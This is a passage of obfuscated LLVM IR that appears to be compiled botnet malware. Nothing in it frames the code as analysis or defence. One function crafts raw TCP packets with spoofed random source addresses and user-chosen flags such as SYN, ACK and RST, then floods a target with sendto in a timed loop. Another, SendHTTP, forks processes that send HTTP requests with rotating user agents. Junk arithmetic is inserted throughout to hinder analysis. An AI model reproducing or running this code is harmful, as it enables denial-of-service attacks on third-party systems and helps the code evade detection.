  br label %537

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %84

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub i32 32, 960438256
  %65 = sub i32 %64, %63
  %66 = add i32 %65, 960438256
  %67 = sub nsw i32 32, %63
  %68 = shl i32 1, %66
  %69 = sub i32 %68, 265687703
  %70 = sub i32 %69, 1
  %71 = add i32 %70, 265687703
  %72 = sub nsw i32 %68, 1
  %73 = xor i32 %71, -1
  %74 = and i32 681539840, %73
  %75 = xor i32 681539840, -1
  %76 = and i32 %71, %75
  %77 = xor i32 -1, -1
  %78 = and i32 %77, 681539840
  %79 = and i32 -1, %75
  %80 = or i32 %74, %76
  %81 = or i32 %78, %79
  %82 = xor i32 %80, %81
  %83 = xor i32 %71, -1
  store i32 %82, i32* %19, align 4
  br label %84

; <label>:84:                                     ; preds = %62, %61
  %85 = load i32, i32* %12, align 4
  %86 = sext i32 %85 to i64
  %87 = sub i64 40, -4402009338437592678
  %88 = add i64 %87, %86
  %89 = add i64 %88, -4402009338437592678
  %90 = add i64 40, %86
  %91 = call i8* @llvm.stacksave()
  store i8* %91, i8** %20, align 8
  %92 = alloca i8, i64 %89, align 16
  %93 = bitcast i8* %92 to %struct.iphdr*
  store %struct.iphdr* %93, %struct.iphdr** %21, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = getelementptr i8, i8* %95, i64 20
  %97 = bitcast i8* %96 to %struct.tcphdr*
  store %struct.tcphdr* %97, %struct.tcphdr** %22, align 8
  %98 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = load i32, i32* %19, align 4
  %103 = call i32 @getRandomIP(i32 %102)
  %104 = call i32 @htonl(i32 %103) #10
  %105 = load i32, i32* %12, align 4
  %106 = sext i32 %105 to i64
  %107 = add i64 20, -8728900680964453
  %108 = add i64 %107, %106
  %109 = sub i64 %108, -8728900680964453
  %110 = add i64 20, %106
  %111 = trunc i64 %109 to i32
  call void @makeIPPacket(%struct.iphdr* %98, i32 %101, i32 %104, i8 zeroext 6, i32 %111)
  %112 = call i32 @rand_cmwc()
  %113 = trunc i32 %112 to i16
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 0
  store i16 %113, i16* %117, align 4
  %118 = call i32 @rand_cmwc()
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon* %120 to %struct.anon.0*
  %122 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %121, i32 0, i32 2
  store i32 %118, i32* %122, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon* %124 to %struct.anon.0*
  %126 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %125, i32 0, i32 3
  store i32 0, i32* %126, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon* %128 to %struct.anon.0*
  %130 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = xor i16 -241, -1
  %133 = xor i16 %131, %132
  %134 = and i16 %133, %131
  %135 = and i16 %131, -241
  %136 = xor i16 %134, -1
  %137 = xor i16 80, -1
  %138 = xor i16 25480, -1
  %139 = and i16 %136, 25480
  %140 = and i16 %134, %138
  %141 = and i16 %137, 25480
  %142 = and i16 80, %138
  %143 = or i16 %139, %140
  %144 = or i16 %141, %142
  %145 = xor i16 %143, %144
  %146 = or i16 %136, %137
  %147 = xor i16 %146, -1
  %148 = or i16 25480, %138
  %149 = and i16 %147, %148
  %150 = or i16 %145, %149
  %151 = or i16 %134, 80
  store i16 %150, i16* %130, align 4
  %152 = load i8*, i8** %11, align 8
  %153 = call i32 @strcmp(i8* %152, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.501, i32 0, i32 0)) #9
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %265, label %155

; <label>:155:                                    ; preds = %84
  %156 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %157 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %156, i32 0, i32 0
  %158 = bitcast %union.anon* %157 to %struct.anon.0*
  %159 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %158, i32 0, i32 4
  %160 = load i16, i16* %159, align 4
  %161 = xor i16 -513, -1
  %162 = xor i16 %160, %161
  %163 = and i16 %162, %160
  %164 = and i16 %160, -513
  %165 = and i16 %163, 512
  %166 = xor i16 %163, 512
  %167 = or i16 %165, %166
  %168 = or i16 %163, 512
  store i16 %167, i16* %159, align 4
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon* %170 to %struct.anon.0*
  %172 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %171, i32 0, i32 4
  %173 = load i16, i16* %172, align 4
  %174 = xor i16 %173, -1
  %175 = xor i16 -1025, -1
  %176 = xor i16 14356, -1
  %177 = or i16 %174, %175
  %178 = or i16 14356, %176
  %179 = xor i16 %177, -1
  %180 = and i16 %179, %178
  %181 = and i16 %173, -1025
  %182 = and i16 %180, 1024
  %183 = xor i16 %180, 1024
  %184 = or i16 %182, %183
  %185 = or i16 %180, 1024
  store i16 %184, i16* %172, align 4
  %186 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon* %187 to %struct.anon.0*
  %189 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = xor i16 -257, -1
  %192 = xor i16 %190, %191
  %193 = and i16 %192, %190
  %194 = and i16 %190, -257
  %195 = xor i16 %193, -1
  %196 = xor i16 256, -1
  %197 = xor i16 22864, -1
  %198 = and i16 %195, 22864
  %199 = and i16 %193, %197
  %200 = and i16 %196, 22864
  %201 = and i16 256, %197
  %202 = or i16 %198, %199
  %203 = or i16 %200, %201
  %204 = xor i16 %202, %203
  %205 = or i16 %195, %196
  %206 = xor i16 %205, -1
  %207 = or i16 22864, %197
  %208 = and i16 %206, %207
  %209 = or i16 %204, %208
  %210 = or i16 %193, 256
  store i16 %209, i16* %189, align 4
  %211 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon* %212 to %struct.anon.0*
  %214 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = xor i16 %215, -1
  %217 = xor i16 -4097, -1
  %218 = xor i16 12743, -1
  %219 = or i16 %216, %217
  %220 = or i16 12743, %218
  %221 = xor i16 %219, -1
  %222 = and i16 %221, %220
  %223 = and i16 %215, -4097
  %224 = xor i16 %222, -1
  %225 = xor i16 4096, -1
  %226 = xor i16 31297, -1
  %227 = and i16 %224, 31297
  %228 = and i16 %222, %226
  %229 = and i16 %225, 31297
  %230 = and i16 4096, %226
  %231 = or i16 %227, %228
  %232 = or i16 %229, %230
  %233 = xor i16 %231, %232
  %234 = or i16 %224, %225
  %235 = xor i16 %234, -1
  %236 = or i16 31297, %226
  %237 = and i16 %235, %236
  %238 = or i16 %233, %237
  %239 = or i16 %222, 4096
  store i16 %238, i16* %214, align 4
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = xor i16 -2049, -1
  %246 = xor i16 %244, %245
  %247 = and i16 %246, %244
  %248 = and i16 %244, -2049
  %249 = xor i16 %247, -1
  %250 = xor i16 2048, -1
  %251 = xor i16 30496, -1
  %252 = and i16 %249, 30496
  %253 = and i16 %247, %251
  %254 = and i16 %250, 30496
  %255 = and i16 2048, %251
  %256 = or i16 %252, %253
  %257 = or i16 %254, %255
  %258 = xor i16 %256, %257
  %259 = or i16 %249, %250
  %260 = xor i16 %259, -1
  %261 = or i16 30496, %251
  %262 = and i16 %260, %261
  %263 = or i16 %258, %262
  %264 = or i16 %247, 2048
  store i16 %263, i16* %243, align 4
  br label %421

; <label>:265:                                    ; preds = %84
  %266 = load i8*, i8** %11, align 8
  %267 = call i8* @strtok(i8* %266, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.502, i32 0, i32 0)) #5
  store i8* %267, i8** %23, align 8
  br label %268

; <label>:268:                                    ; preds = %418, %265
  %269 = load i8*, i8** %23, align 8
  %270 = icmp ne i8* %269, null
  br i1 %270, label %271, label %420

; <label>:271:                                    ; preds = %268
  %272 = load i8*, i8** %23, align 8
  %273 = call i32 @strcmp(i8* %272, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.503, i32 0, i32 0)) #9
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %305, label %275

; <label>:275:                                    ; preds = %271
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon* %277 to %struct.anon.0*
  %279 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = xor i16 %280, -1
  %282 = xor i16 -513, -1
  %283 = xor i16 429, -1
  %284 = or i16 %281, %282
  %285 = or i16 429, %283
  %286 = xor i16 %284, -1
  %287 = and i16 %286, %285
  %288 = and i16 %280, -513
  %289 = xor i16 %287, -1
  %290 = xor i16 512, -1
  %291 = xor i16 1664, -1
  %292 = and i16 %289, 1664
  %293 = and i16 %287, %291
  %294 = and i16 %290, 1664
  %295 = and i16 512, %291
  %296 = or i16 %292, %293
  %297 = or i16 %294, %295
  %298 = xor i16 %296, %297
  %299 = or i16 %289, %290
  %300 = xor i16 %299, -1
  %301 = or i16 1664, %291
  %302 = and i16 %300, %301
  %303 = or i16 %298, %302
  %304 = or i16 %287, 512
  store i16 %303, i16* %279, align 4
  br label %418

; <label>:305:                                    ; preds = %271
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.504, i32 0, i32 0)) #9
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %327, label %309

; <label>:309:                                    ; preds = %305
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = xor i16 %314, -1
  %316 = xor i16 -1025, -1
  %317 = xor i16 -27712, -1
  %318 = or i16 %315, %316
  %319 = or i16 -27712, %317
  %320 = xor i16 %318, -1
  %321 = and i16 %320, %319
  %322 = and i16 %314, -1025
  %323 = and i16 %321, 1024
  %324 = xor i16 %321, 1024
  %325 = or i16 %323, %324
  %326 = or i16 %321, 1024
  store i16 %325, i16* %313, align 4
  br label %417

; <label>:327:                                    ; preds = %305
  %328 = load i8*, i8** %23, align 8
  %329 = call i32 @strcmp(i8* %328, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.505, i32 0, i32 0)) #9
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %345, label %331

; <label>:331:                                    ; preds = %327
  %332 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon* %333 to %struct.anon.0*
  %335 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %334, i32 0, i32 4
  %336 = load i16, i16* %335, align 4
  %337 = xor i16 -257, -1
  %338 = xor i16 %336, %337
  %339 = and i16 %338, %336
  %340 = and i16 %336, -257
  %341 = and i16 %339, 256
  %342 = xor i16 %339, 256
  %343 = or i16 %341, %342
  %344 = or i16 %339, 256
  store i16 %343, i16* %335, align 4
  br label %416

; <label>:345:                                    ; preds = %327
  %346 = load i8*, i8** %23, align 8
  %347 = call i32 @strcmp(i8* %346, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.506, i32 0, i32 0)) #9
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %379, label %349

; <label>:349:                                    ; preds = %345
  %350 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon* %351 to %struct.anon.0*
  %353 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = xor i16 %354, -1
  %356 = xor i16 -4097, -1
  %357 = xor i16 -24712, -1
  %358 = or i16 %355, %356
  %359 = or i16 -24712, %357
  %360 = xor i16 %358, -1
  %361 = and i16 %360, %359
  %362 = and i16 %354, -4097
  %363 = xor i16 %361, -1
  %364 = xor i16 4096, -1
  %365 = xor i16 -8995, -1
  %366 = and i16 %363, -8995
  %367 = and i16 %361, %365
  %368 = and i16 %364, -8995
  %369 = and i16 4096, %365
  %370 = or i16 %366, %367
  %371 = or i16 %368, %369
  %372 = xor i16 %370, %371
  %373 = or i16 %363, %364
  %374 = xor i16 %373, -1
  %375 = or i16 -8995, %365
  %376 = and i16 %374, %375
  %377 = or i16 %372, %376
  %378 = or i16 %361, 4096
  store i16 %377, i16* %353, align 4
  br label %415

; <label>:379:                                    ; preds = %345
  %380 = load i8*, i8** %23, align 8
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.507, i32 0, i32 0)) #9
  %382 = icmp ne i32 %381, 0
  br i1 %382, label %413, label %383

; <label>:383:                                    ; preds = %379
  %384 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon* %385 to %struct.anon.0*
  %387 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %386, i32 0, i32 4
  %388 = load i16, i16* %387, align 4
  %389 = xor i16 %388, -1
  %390 = xor i16 -2049, -1
  %391 = xor i16 -20890, -1
  %392 = or i16 %389, %390
  %393 = or i16 -20890, %391
  %394 = xor i16 %392, -1
  %395 = and i16 %394, %393
  %396 = and i16 %388, -2049
  %397 = xor i16 %395, -1
  %398 = xor i16 2048, -1
  %399 = xor i16 25723, -1
  %400 = and i16 %397, 25723
  %401 = and i16 %395, %399
  %402 = and i16 %398, 25723
  %403 = and i16 2048, %399
  %404 = or i16 %400, %401
  %405 = or i16 %402, %403
  %406 = xor i16 %404, %405
  %407 = or i16 %397, %398
  %408 = xor i16 %407, -1
  %409 = or i16 25723, %399
  %410 = and i16 %408, %409
  %411 = or i16 %406, %410
  %412 = or i16 %395, 2048
  store i16 %411, i16* %387, align 4
  br label %414

; <label>:413:                                    ; preds = %379
  br label %414

; <label>:414:                                    ; preds = %413, %383
  br label %415

; <label>:415:                                    ; preds = %414, %349
  br label %416

; <label>:416:                                    ; preds = %415, %331
  br label %417

; <label>:417:                                    ; preds = %416, %309
  br label %418

; <label>:418:                                    ; preds = %417, %275
  %419 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %419, i8** %23, align 8
  br label %268

; <label>:420:                                    ; preds = %268
  br label %421

; <label>:421:                                    ; preds = %420, %155
  %422 = call i32 @rand_cmwc()
  %423 = trunc i32 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon* %425 to %struct.anon.0*
  %427 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %426, i32 0, i32 5
  store i16 %423, i16* %427, align 2
  %428 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon* %429 to %struct.anon.0*
  %431 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %430, i32 0, i32 6
  store i16 0, i16* %431, align 4
  %432 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 0
  %434 = bitcast %union.anon* %433 to %struct.anon.0*
  %435 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %434, i32 0, i32 7
  store i16 0, i16* %435, align 2
  %436 = load i32, i32* %9, align 4
  %437 = icmp eq i32 %436, 0
  br i1 %437, label %438, label %440

; <label>:438:                                    ; preds = %421
  %439 = call i32 @rand_cmwc()
  br label %445

; <label>:440:                                    ; preds = %421
  %441 = load i32, i32* %9, align 4
  %442 = trunc i32 %441 to i16
  %443 = call zeroext i16 @htons(i16 zeroext %442) #10
  %444 = zext i16 %443 to i32
  br label %445

; <label>:445:                                    ; preds = %440, %438
  %446 = phi i32 [ %439, %438 ], [ %444, %440 ]
  %447 = trunc i32 %446 to i16
  %448 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  %450 = bitcast %union.anon* %449 to %struct.anon.0*
  %451 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %450, i32 0, i32 1
  store i16 %447, i16* %451, align 2
  %452 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %453 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %454 = call zeroext i16 @tcpcsum(%struct.iphdr* %452, %struct.tcphdr* %453)
  %455 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 0
  %457 = bitcast %union.anon* %456 to %struct.anon.0*
  %458 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %457, i32 0, i32 6
  store i16 %454, i16* %458, align 4
  %459 = bitcast i8* %92 to i16*
  %460 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 2
  %462 = load i16, i16* %461, align 2
  %463 = zext i16 %462 to i32
  %464 = call zeroext i16 @csum(i16* %459, i32 %463)
  %465 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 7
  store i16 %464, i16* %466, align 2
  %467 = call i64 @time(i64* null) #5
  %468 = load i32, i32* %10, align 4
  %469 = sext i32 %468 to i64
  %470 = add i64 %467, 4888897395658335970
  %471 = add i64 %470, %469
  %472 = sub i64 %471, 4888897395658335970
  %473 = add nsw i64 %467, %469
  %474 = trunc i64 %472 to i32
  store i32 %474, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %475

; <label>:475:                                    ; preds = %529, %528, %445
  br label %476

; <label>:476:                                    ; preds = %475
  %477 = load i32, i32* %17, align 4
  %478 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %479 = call i64 @sendto(i32 %477, i8* %92, i64 %89, i32 0, %struct.sockaddr* %478, i32 16)
  %480 = load i32, i32* %19, align 4
  %481 = call i32 @getRandomIP(i32 %480)
  %482 = call i32 @htonl(i32 %481) #10
  %483 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 8
  store i32 %482, i32* %484, align 4
  %485 = call i32 @rand_cmwc()
  %486 = trunc i32 %485 to i16
  %487 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 3
  store i16 %486, i16* %488, align 4
  %489 = call i32 @rand_cmwc()
  %490 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 0
  %492 = bitcast %union.anon* %491 to %struct.anon.0*
  %493 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %492, i32 0, i32 2
  store i32 %489, i32* %493, align 4
  %494 = call i32 @rand_cmwc()
  %495 = trunc i32 %494 to i16
  %496 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = bitcast %union.anon* %497 to %struct.anon.0*
  %499 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %498, i32 0, i32 0
  store i16 %495, i16* %499, align 4
  %500 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 0
  %502 = bitcast %union.anon* %501 to %struct.anon.0*
  %503 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %502, i32 0, i32 6
  store i16 0, i16* %503, align 4
  %504 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %505 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %506 = call zeroext i16 @tcpcsum(%struct.iphdr* %504, %struct.tcphdr* %505)
  %507 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 0
  %509 = bitcast %union.anon* %508 to %struct.anon.0*
  %510 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %509, i32 0, i32 6
  store i16 %506, i16* %510, align 4
  %511 = bitcast i8* %92 to i16*
  %512 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i32 0, i32 2
  %514 = load i16, i16* %513, align 2
  %515 = zext i16 %514 to i32
  %516 = call zeroext i16 @csum(i16* %511, i32 %515)
  %517 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %518 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %517, i32 0, i32 7
  store i16 %516, i16* %518, align 2
  %519 = load i32, i32* %25, align 4
  %520 = load i32, i32* %15, align 4
  %521 = icmp eq i32 %519, %520
  br i1 %521, label %522, label %529

; <label>:522:                                    ; preds = %476
  %523 = call i64 @time(i64* null) #5
  %524 = load i32, i32* %24, align 4
  %525 = sext i32 %524 to i64
  %526 = icmp sgt i64 %523, %525
  br i1 %526, label %527, label %528

; <label>:527:                                    ; preds = %522
  br label %535

; <label>:528:                                    ; preds = %522
  store i32 0, i32* %25, align 4
  br label %475

; <label>:529:                                    ; preds = %476
  %530 = load i32, i32* %25, align 4
  %531 = sub i32 %530, 466885697
  %532 = add i32 %531, 1
  %533 = add i32 %532, 466885697
  %534 = add i32 %530, 1
  store i32 %533, i32* %25, align 4
  br label %475

; <label>:535:                                    ; preds = %527
  %536 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %536)
  br label %537

; <label>:537:                                    ; preds = %535, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add i64 %19, 7915001100112363820
  %23 = add i64 %22, %21
  %24 = sub i64 %23, 7915001100112363820
  %25 = add nsw i64 %19, %21
  %26 = trunc i64 %24 to i32
  store i32 %26, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %70, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %75

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = load i8*, i8** %10, align 8
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.509, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %69

; <label>:44:                                     ; preds = %31
  br label %45

; <label>:45:                                     ; preds = %67, %44
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @time(i64* null) #5
  %49 = icmp sgt i64 %47, %48
